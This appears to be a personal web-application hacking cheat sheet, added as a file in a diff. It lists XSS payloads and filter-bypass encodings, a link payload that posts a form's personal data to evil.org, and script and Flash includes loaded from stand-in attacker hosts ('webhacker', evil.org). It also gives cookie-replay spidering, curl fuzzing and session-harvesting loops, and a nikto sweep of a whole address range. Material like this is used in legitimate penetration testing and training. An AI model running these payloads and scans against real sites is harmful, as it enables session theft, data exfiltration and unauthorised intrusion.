@@ -1,0 +1,210 @@
+Hack Notes
+
+echo -e "HEAD /HTTP/1.0\n\n" | nc -vv website.com
+echo -e "HEAD /HTTP/1.0\n\n" | openssl s_client
+-quit -connect website:443
+
+nikto -p 80 -h website -verbose
+whisker2.1 -p 80 -h website
+
+enum all extensions: .asp,.aspx,.css,.htc,.htr,.htw,.ida,.idc,.idq,.printer,.shtm,.xml,.xsl
+
+previous version of pages:~
+extensions: .bak,.old,.orig,.txt
+search for common directories such as:~
+/bak,/inc,/old,/script
+
+SQL connection strings:~
+db=
+dbconn=
+
+~:xss payloads to check:~
+<script>alert(document.cookie)</script>
+
+1.attempt different embedding method: %3cscript%3e, %253cscript%253e, %00%3cscript%3e
+<scrscriptipt>
+(first “script” is removed, but “scr” + “ipt” == “script”)
+
+2.check if injection is possibl on common active tags: <script>,<object>,<applet>,<embed>,<form>
+
+3.Non <SCRIPT> attacks:
+“ [event]=‘code’
+<A HREF=“exploit string”>Go</A>
+resulting in:
+<A HREF=““ [event]=‘code’“>Go</A>
+<b onMouseOver=“self.location.href=‘http://webhacker/’
+“>bolded text</b>
+ 
+ 4.Dynamic URL attacks:
+<a href=“http://trusted.org/search_main.asp?
+SearchString=%22+onmouoseover%3D%27ClientForm%
+2Eaction%3D%22evil%2Eorg%2Fget%2Easp%3FData%
+3D%22+%2B+
+ClientForm%2EPersonalData%3BClientForm%
+2Esubmit%3B%27”>FooBar</a>
+
+5.Bypassing XSS filters using
+encoding:
+Example1:
+‘) + ‘\x3cscript src=
+http://webhacker/malicious.js\x3e\x3c/script\x3e’
+Example2:
+http://website/search.cgi?query=
+%26%7balert%28%27EVIL %27%29%7d%3b&apropos=
+pos2
+
+6.Flash attacks:
+For instance, instead of:
+getURL(“http://www.technicalinfo.net”)
+It is possible to specify scripting code:
+getURL(“javascript:alert(document.cookie)”)
+<EMBED
+src=“http://evil.org/badflash.swf”
+pluginspage=“http://www.macromedia.com/shockwave/
+download/index.cgi?
+P1_Prod_Version=ShockwaveFlash”
+type=“application/x-shockwave-flash”
+width=“100”
+height=“100”>
+</EMBED>
+
+
+
+*Use wget to spider a site that uses form-based authentication.
+1. Use valid credentials to authenticate to site.
+2. Record session cookie(s) set by the server.
+3. Store session cookie in a file “session.txt”.
+4. Run wget with the session cookie (this is a replay attack):
+wget --load-cookies -cookies=on -r
+https://website
+
+*Use Curl and wget to spider a site that uses form-based authentication.
+curl \
+--verbose \
+--cookie-jar cookies.txt \
+--data ‘username=foo’ \ (use single quotes)
+--data ‘password=bar’ \ (use single quotes)
+--url https://website/login.asp
+wget –load-cookies –cookies=on –r
+https://website/menu.asp
+
+*Use shell variables with Curl.
+#!/bin/sh
+PASS=mypassword
+curl \
+--verbose \
+--data ‘username=barney’ \ (use single quotes)
+--data “password=$PASS” \ (use double quotes)
+--url https://website/login.php
+
+*Perform “fuzzing” with Curl and Perl.
+#!/bin/sh
+# backticks at beginning and end of command
+# single quotes around print “A” x 1000
+# double quotes only around A
+BUFFER=`perl –e ‘print “A” x 1000’`
+curl \
+--verbose \
+--get \
+--data “sessid=$BUFFER” \
+--url http://website/boards/message.php
+
+*Gather multiple session IDs with
+Curl for off-line analysis of trends and
+“randomness”.
+#!/bin/sh
+NAME=neo
+PASS=trinity
+while [ 1 ]
+do
+curl \
+--output /dev/null \
+--cookie-jar cookies.txt \
+--data 'login_attempt=1' \
+--data 'CustomerID=' \
+--data 'CompanyName=Foundstone' \
+--data "name=$NAME" \
+--data "password=$PASS" \
+--url http://website/auth.asp
+ID=`grep identity cookies.txt`
+echo "$ID" >> cookie.store
+done
+
+*Generate a PEM file for Achilles
+or stunnel.
+1. Use the openssl command:
+openssl req -new -x509 -days 365 -nodes \
+-out cert.pem -keyout cert.pem
+2. Provide answers for each prompt (country, location, etc.)
+
+*Use stunnel 3.x in client mode—accept HTTP and redirect to HTTPS.
+1. Launch stunnel but do not fork. This is helpful for debugging
+connections. You must have root privileges to listen on port 80,
+otherwise choose a port >1024.
+stunnel –f –P none –p stunnel.pem –c \
+–d localhost:80 –r sslsite:443
+
+*Use stunnel 4.x in client mode—accept HTTPS and redirect to HTTP.
+1. Specify the certificate in the stunnel.conf file:
+cert = /usr/local/etc/stunnel/stunnel.pem
+2. Make sure the chroot directory specified in the stunnel.conf file exists:
+chroot = /usr/local/var/run/stunnel
+3. Make sure the “setuid” and “setgid” user defined in stunnel.conf has
+write permissions the chroot directory:
+chown –R nobody /usr/local/var/run/stunnel
+chgrp –R nobody /usr/local/var/run/stunnel
+4. Hint: Do not launch stunnel in daemon mode; this helps to debug
+connections. In stunnel.conf add the directive:
+foreground = yes
+5. Place stunnel in client mode. Add the client directive outside of a
+service definition (the service definition is made in step 6):
+client = yes
+6. Create the HTTP listener in stunnel.conf:
+[http]
+accept = 80
+connect = sslsite:443
+TIMEOUTclose = 0
+
+*
+Use stunnel 3.x in server mode—accept HTTPS and redirect to HTTP.
+1. Launch stunnel but do not fork. This is helpful for debugging
+connections. You must have root privileges to listen on port 443,
+otherwise choose a port >1024.
+stunnel –f –P none –p stunnel.pem \
+–d localhost:443 –r website:80
+
+*Use stunnel 4.x in server mode—accept HTTPS and redirect to HTTP.
+1. Specify the certificate in the stunnel.conf file:
+cert = /usr/local/etc/stunnel/stunnel.pem
+2. Make sure the chroot directory specified in the stunnel.conf file exists:
+chroot = /usr/local/var/run/stunnel
+3. Make sure the “setuid” and “setgid” user defined in stunnel.conf has
+write permissions the chroot directory:
+chown –R nobody /usr/local/var/run/stunnel
+chgrp –R nobody /usr/local/var/run/stunnel
+4. Hint: Do not launch stunnel in daemon mode; this helps to debug
+connections. In stunnel.conf add the directive:
+foreground = yes
+5. Create the HTTPS listener in stunnel.conf:
+[https]
+accept = 443
+connect = website:80
+TIMEOUTclose = 0
+
+*Use Nikto against a range of IP addresses.
+1. Generate file that contains list of web servers listening on port 80:
+nmap -P0 -p 80 -oG temp.txt 10.20.0.0/16
+grep open temp.txt | cut -d' ' -f2 > targets.txt
+2. Create looping shell script:
+#!/bin/sh
+# nikto-loop.sh
+for IP in `cat $1` (use back ticks)
+do
+./nikto.pl –verbose –w –p 80 -h $IP \
+–o results/nikto.$IP.html
+done
+3. Launch Nikto:
+mkdir results
+./nikto-loop.sh targets.txt
+
+
